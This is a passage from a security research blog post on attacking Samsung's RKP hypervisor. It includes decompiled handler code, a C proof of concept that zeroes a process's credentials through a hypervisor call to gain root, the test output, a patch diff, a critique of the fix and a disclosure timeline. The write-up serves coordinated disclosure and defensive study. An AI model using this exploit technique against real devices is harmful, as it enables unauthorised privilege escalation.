<p>Interesting targets includes anything that is set as read-only in the stage 2, e.g. the kernel page tables, <code>struct cred</code>, <code>struct task_security_struct</code>, etc.</p>
<p>We need to find the command handlers using <code>virt_to_phys_el1</code> that can be called after the hypervisor is fully initialized. The relevant command handlers are:</p>
<ul>
<li><code>rkp_cmd_rkp_robuffer_alloc</code>, that will write the address of the newly allocated page;</li>
</ul>
<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_cmd_rkp_robuffer_alloc</span><span class="p">(</span><span class="n">saved_regs_t</span><span class="o">*</span> <span class="n">regs</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="n">page</span> <span class="o">=</span> <span class="n">page_allocator_alloc_page</span><span class="p">();</span>
  <span class="n">ret_va</span> <span class="o">=</span> <span class="n">regs</span><span class="o">-&gt;</span><span class="n">x2</span><span class="p">;</span>
  <span class="c1">// ...</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">ret_va</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// ...</span>
    <span class="o">*</span><span class="n">virt_to_phys_el1</span><span class="p">(</span><span class="n">ret_va</span><span class="p">)</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">regs</span><span class="o">-&gt;</span><span class="n">x0</span> <span class="o">=</span> <span class="n">page</span><span class="p">;</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<ul>
<li><code>rkp_cmd_dynamic_load</code>, that will write the return code of the subcommand.</li>
</ul>
<div class="codehilite"><pre><span></span><code><span class="kt">int64_t</span> <span class="nf">rkp_cmd_dynamic_load</span><span class="p">(</span><span class="n">saved_regs_t</span><span class="o">*</span> <span class="n">regs</span><span class="p">)</span> <span class="p">{</span>
  <span class="c1">// ...</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_COMMAND_BREAKDOWN_BEFORE_INIT</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">dynamic_breakdown_before_init</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">);</span>
    <span class="c1">// ...</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_COMMAND_INS</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">dynamic_load_ins</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">);</span>
    <span class="c1">// ...</span>
  <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="n">type</span> <span class="o">==</span> <span class="n">RKP_DYN_COMMAND_RM</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="n">dynamic_load_rm</span><span class="p">(</span><span class="n">rkp_dyn</span><span class="p">);</span>
    <span class="c1">// ...</span>
  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="n">res</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="n">ret_va</span> <span class="o">=</span> <span class="n">regs</span><span class="o">-&gt;</span><span class="n">x4</span><span class="p">;</span>
  <span class="k">if</span> <span class="p">(</span><span class="n">ret_va</span><span class="p">)</span>
    <span class="o">*</span><span class="n">virt_to_phys_el1</span><span class="p">(</span><span class="n">ret_va</span><span class="p">)</span> <span class="o">=</span> <span class="n">res</span><span class="p">;</span>
  <span class="n">regs</span><span class="o">-&gt;</span><span class="n">x0</span> <span class="o">=</span> <span class="n">res</span><span class="p">;</span>
  <span class="k">return</span> <span class="n">res</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>In particular, when specifying an invalid subcommand to <code>rkp_cmd_dynamic_load</code>, the return code will be 0, which can be used to change a UID/GID to 0 (<code>root</code>).</p>
<h3 id="proof-of-concept_2">Proof of Concept<a class="headerlink" href="#proof-of-concept_2" title="Permanent link">¶</a></h3>
<div class="codehilite"><pre><span></span><code><span class="cp">#define UH_APP_RKP       0xc300c002</span>
<span class="cp">#define RKP_DYNAMIC_LOAD 0x20</span>

<span class="kt">void</span> <span class="nf">print_ids</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">uid_t</span> <span class="n">ruid</span><span class="p">,</span> <span class="n">euid</span><span class="p">,</span> <span class="n">suid</span><span class="p">;</span>
    <span class="n">getresuid</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ruid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">eudi</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">suid</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Uid: %d %d %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">ruid</span><span class="p">,</span> <span class="n">euid</span><span class="p">,</span> <span class="n">suid</span><span class="p">);</span>

    <span class="kt">gid_t</span> <span class="n">rgid</span><span class="p">,</span> <span class="n">egid</span><span class="p">,</span> <span class="n">sgid</span><span class="p">;</span>
    <span class="n">getresgid</span><span class="p">(</span><span class="o">&amp;</span><span class="n">rgid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">egid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sgid</span><span class="p">);</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">"Gid: %d %d %d</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">rgid</span><span class="p">,</span> <span class="n">egid</span><span class="p">,</span> <span class="n">sgid</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">write_zero</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">rkp_dyn_p</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">ret_p</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">kernel_hyp_call</span><span class="p">(</span><span class="n">UH_APP_RKP</span><span class="p">,</span> <span class="n">RKP_DYNAMIC_LOAD</span><span class="p">,</span> <span class="mi">42</span><span class="p">,</span> <span class="n">rkp_dyn_p</span><span class="p">,</span> <span class="n">ret_p</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">exploit</span><span class="p">()</span> <span class="p">{</span>
    <span class="cm">/* print the old credentials */</span>
    <span class="n">print_ids</span><span class="p">();</span>

    <span class="cm">/* get the struct cred of the current task */</span>
    <span class="kt">uint64_t</span> <span class="n">current</span> <span class="o">=</span> <span class="n">kernel_get_current</span><span class="p">();</span>
    <span class="kt">uint64_t</span> <span class="n">cred</span> <span class="o">=</span> <span class="n">kernel_read</span><span class="p">(</span><span class="n">current</span> <span class="o">+</span> <span class="mi">1968</span><span class="p">);</span>

    <span class="cm">/* allocate the argument structure */</span>
    <span class="kt">uint64_t</span> <span class="n">rkp_dyn_p</span> <span class="o">=</span> <span class="n">kernel_alloc</span><span class="p">(</span><span class="mh">0x38</span><span class="p">);</span>
    <span class="cm">/* zero the fields of the struct cred */</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">36</span><span class="p">;</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">)</span>
        <span class="n">write_zero</span><span class="p">(</span><span class="n">rkp_dyn_p</span><span class="p">,</span> <span class="n">cred</span> <span class="o">+</span> <span class="n">i</span><span class="p">);</span>

    <span class="cm">/* print the new credentials */</span>
    <span class="n">print_ids</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></div>

<div class="codehilite"><pre><span></span><code>Uid: 2000 2000 2000
Gid: 2000 2000 2000
Uid: 0 0 0
Gid: 0 0 0
</code></pre></div>

<p>As a result of running the proof of concept, we can see that our credentials changed from <code>shell</code> to <code>root</code>.</p>
<p>The exploit was successfully tested on the most recent firmware 
available for our test device (at the time of the report): 
A515FXXU4CTJ1. The two-fold bug appeared to be present in the binaries 
of Exynos devices, including the S10/S10+/S20/S20+ flagship devices, but
 its exploitability on these devices is uncertain.</p>
<p>The prerequisites for exploiting this vulnerability are high: being 
able to make an hypervisor call with only an arbitrary read and write of
 kernel memory is no small feat on devices where JOPP/ROPP are enabled.</p>
<h2 id="patch_2">Patch<a class="headerlink" href="#patch_2" title="Permanent link">¶</a></h2>
<p>Here is the immediate remediation step that we suggested to Samsung:</p>
<div class="codehilite"><pre><span></span><code>- Add a flag to virt_to_phys_el1 to specify if it should check if the memory
needs to be readable or writable from the kernel, or split this function in two
</code></pre></div>

<p>To see how Samsung patched this vulnerability, we binary diffed the 
most recent firmware available for the Samsung Galaxy S10 (at the time 
of checking the first patch): <code>G973FXXSBFUF3</code>. We could not 
use the latest firmware for the Samsung Galaxy A51 as this device had 
not been updated to the June patch level yet.</p>
<p>There have been some changes to <code>rkp_cmd_rkp_robuffer_alloc</code> and <code>rkp_cmd_dynamic_load</code>.</p>
<div class="codehilite"><pre><span></span><code>int64_t rkp_cmd_rkp_robuffer_alloc(saved_regs_t *regs) {
  // ...
  page = page_allocator_alloc_page();
  ret_va = regs-&gt;x2;
  // ...
  if (ret_va) {
    // ...
<span class="gd">-    *virt_to_phys_el1(ret_va) = page;</span>
<span class="gi">+    ret_pa = virt_to_phys_el1(ret_va);</span>
<span class="gi">+    rkp_phys_map_lock(ret_pa);</span>
<span class="gi">+    if (!is_phys_map_free(ret_pa)) {</span>
<span class="gi">+      rkp_phys_map_unlock(ret_pa);</span>
<span class="gi">+      rkp_policy_violation("RKP_07fb818a");</span>
<span class="gi">+    }</span>
<span class="gi">+    *ret_pa = page;</span>
<span class="gi">+    rkp_phys_map_unlock(ret_pa);</span>
  }
  regs-&gt;x0 = page;
  return 0;
}
</code></pre></div>

<div class="codehilite"><pre><span></span><code>int64_t rkp_cmd_dynamic_load(saved_regs_t *regs) {
  // ...
  if (type == RKP_DYN_COMMAND_BREAKDOWN_BEFORE_INIT) {
    res = dynamic_breakdown_before_init(rkp_dyn);
    // ...
  } else if (type == RKP_DYN_COMMAND_INS) {
    res = dynamic_load_ins(rkp_dyn);
    // ...
  } else if (type == RKP_DYN_COMMAND_RM) {
    res = dynamic_load_rm(rkp_dyn);
    // ...
  } else {
    res = 0;
  }
  ret_va = regs-&gt;x4;
<span class="gd">-  if (ret_va)</span>
<span class="gd">-    *virt_to_phys_el1(ret_va) = res;</span>
<span class="gi">+  if (ret_va) {</span>
<span class="gi">+    ret_pa = rkp_get_pa(ret_va);</span>
<span class="gi">+    rkp_phys_map_lock(ret_pa);</span>
<span class="gi">+    if (!is_phys_map_free(ret_pa)) {</span>
<span class="gi">+      rkp_phys_map_unlock(ret_pa);</span>
<span class="gi">+      rkp_policy_violation("RKP_07fb818a");</span>
<span class="gi">+    }</span>
<span class="gi">+    rkp_phys_map_unlock(ret_pa);</span>
<span class="gi">+    *ret_pa = res;</span>
<span class="gi">+  }</span>
  regs-&gt;x0 = res;
  return res;
}
</code></pre></div>

<p>The two command handlers that we said could be used to exploit this 
vulnerability were modified. Specifically, they are now checking that 
the kernel-provided address is marked as <code>FREE</code> in the <code>physmap</code>, and triggering a policy violation if it isn't.</p>
<p>While the patch works, because there are no other command handlers accessible after initialization that is using <code>virt_to_phys_el1</code>, we think it is suboptimal:</p>
<ul>
<li>it is possible that someone at Samsung might forget to implement the
 new check if a new command handler is being added, which would not have
 happened if they had added a flag denoting read or write access to <code>virt_to_phys_el1</code> like we suggested.</li>
<li>it also assumes that anything that is not writable from the kernel will not be marked as <code>FREE</code>, but if they ever forget to do that, it will re-introduce this vulnerability.</li>
</ul>
<h1 id="conclusion">Conclusion<a class="headerlink" href="#conclusion" title="Permanent link">¶</a></h1>
<p>In this conclusion, we would like to give you our honest thoughts about Samsung RKP and its implementation (as of early 2021).</p>
<p>Talking strictly about the implementation itself, we think that 
because the codebase has been around for a few years already, it has 
increased a lot in complexity. This might explain why vulnerabilities 
like the ones we have seen today and <a href="https://duasynt.com/blog/samsung-s20-rkp-selinux-disable">configuration</a> <a href="https://securitylab.github.com/research/qualcomm_npu/#bypassing-selinux-and-popping-a-reverse-root-shell">mistakes</a>
 can happen. We are confident that are other bugs lurking in the code 
that we have glossed over. In particular, the choice of duplicating 
information that is already in the stage 2 page tables (for example the <code>S2AP</code> bit and the <code>ro_bitmap</code>)
 is very error-prone. In the future, we will be blogging about another 
security hypervisor implementation that is doing things differently, and
 comparing it to Samsung's implementation.</p>
<p>Talking about the impact of Samsung RKP on the overall device 
security, we believe that it is contributing to making the device more 
secure, despite the flaws of the implementation. As a defense-in-depth 
measure, it is making it harder for an attacker to compromise the 
device. When writing an Android kernel exploit, an attacker will need to
 find an RKP bypass if they intend to get code execution on a Samsung 
device. Unfortunately, there are <a href="https://github.com/chompie1337/s8_2019_2215_poc/blob/34f6481ed4ed4cff661b50ac465fc73655b82f64/poc/selinux_bypass.c#L16">known</a> <a href="https://github.com/vngkv123/articles/blob/main/Galaxy%27s%20Meltdown%20-%20Exploiting%20SVE-2020-18610.md#bypass-selinux">bypasses</a> that need to be addressed by Samsung.</p>
<h1 id="timeline">Timeline<a class="headerlink" href="#timeline" title="Permanent link">¶</a></h1>
<p><strong>SVE-2021-20178</strong></p>
<ul>
<li>Jan. 04, 2021 - Initial report sent to Samsung.</li>
<li>Jan. 05, 2021 - A security analyst is assigned to the issue.</li>
<li>Jan. 19, 2021 - We ask for updates.</li>
<li>Jan. 25, 2021 - No updates at the moment.</li>
<li>Feb. 17, 2021 - Vulnerability is confirmed.</li>
<li>Mar. 03, 2021 - We ask for updates.</li>
<li>Mar. 04, 2021 - The issue will be patched in the May security update.</li>
<li>May  04, 2021 - We ask for updates.</li>
<li>May  10, 2021 - The issue will be patched in the June security update.</li>
<li>Jun. 08, 2021 - Notification that the update patching the vulnerability has been released.</li>
<li>Jul. 20, 2021 - We reopen the issue after binary diffing the fix.</li>
<li>Jul. 30, 2021 - The issue will be patched in the October security update.</li>
<li>Oct. 05, 2021 - Notification that the update patching the vulnerability has been released.</li>
</ul>
<p><strong>SVE-2021-20179</strong></p>
<ul>
<li>Jan. 04, 2021 - Initial report sent to Samsung.</li>
<li>Jan. 05, 2021 - A security analyst is assigned to the issue.</li>
<li>Jan. 19, 2021 - We ask for updates.</li>
<li>Jan. 25, 2021 - No updates at the moment.</li>
<li>Feb. 17, 2021 - Vulnerability is confirmed.</li>
<li>Mar. 03, 2021 - We ask for updates.</li>
<li>Mar. 04, 2021 - The issue will be patched in the May security update.</li>
<li>May  04, 2021 - We ask for updates.</li>
<li>May  10, 2021 - The issue will be patched in the June security update.</li>
<li>Jun. 06, 2021 - Notification that the update patching the vulnerability has been released.</li>
</ul>
<p><strong>SVE-2021-20176</strong></p>
<ul>
<li>Jan. 04, 2021 - Initial report sent to Samsung.</li>
<li>Jan. 05, 2021 - A security analyst is assigned to the issue.</li>
<li>Jan. 19, 2021 - We ask for updates.</li>
<li>Jan. 29, 2021 - No updates at the moment.</li>
<li>Mar. 03, 2021 - We ask for updates.</li>
<li>Mar. 04, 2021 - Vulnerability is confirmed.</li>
<li>May  04, 2021 - We ask for updates.</li>
<li>May  10, 2021 - The issue will be patched in the June security update.</li>
<li>Jun. 06, 2021 - We ask for updates.</li>
<li>Jun. 23, 2021 - Notification that the update patching the vulnerability has been released.</li>
</ul>
</span>
<!-- Blogpost content end ================================================= -->

</span>

            </div>

            <!-- Copyright & Links to social media -->
            <div id="copyright">
                <div id="links-social" class="columns is-centered">
                    <div class="column is-narrow is-full-mobile">
                        <a href="https://impalabs.com/">
                            <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/impalabs.svg" alt="Impalabs icon" width="30px" height="30px">&nbsp;Website
                        </a>
                        <a href="https://twitter.com/the_impalabs">
                            <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/twitter.svg" alt="Twitter icon" width="30px" height="30px">&nbsp;Twitter
                        </a>
                    </div>
                    <div class="column is-narrow is-full-mobile">
                        <a href="https://linkedin.com/company/impalabs">
                            <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/linkedin.svg" alt="Linkedin icon" width="30px" height="30px">&nbsp;LinkedIn
                        </a>
                        <a href="https://github.com/impalabs">
                            <img src="2021%20-%20Attacking%20Samsung%20RKP%20-%20Impalabs%20Blog_files/github.svg" alt="Github icon" width="30px" height="30px">&nbsp;GitHub
                        </a>
                    </div>
                </div>
                <p class="copyright-text">Copyright © Impalabs 2021</p>
            </div>
        </div>
    </section>


</body></html>